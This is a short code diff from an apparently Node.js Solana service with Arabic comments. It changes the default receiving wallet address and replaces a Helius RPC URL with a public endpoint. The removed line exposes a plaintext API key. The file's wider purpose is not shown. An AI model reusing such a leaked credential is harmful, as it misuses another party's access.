@@ -16,12 +16,13 @@ const PORT = process.env.PORT || 5000;
 // ============ متغيرات البيئة (تضاف على Railway) ============
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg';
+const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
 const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 
 // ============ اتصال Solana ============
+// استبدل الرابط الحالي بهذا الرابط
 const connection = new Connection(
-  'https://mainnet.helius-rpc.com/?api-key=8f5ecd9c-6e46-42dc-9691-f807e5f89558',
+  'https://solana.public-rpc.com',
   'confirmed'
 );
 
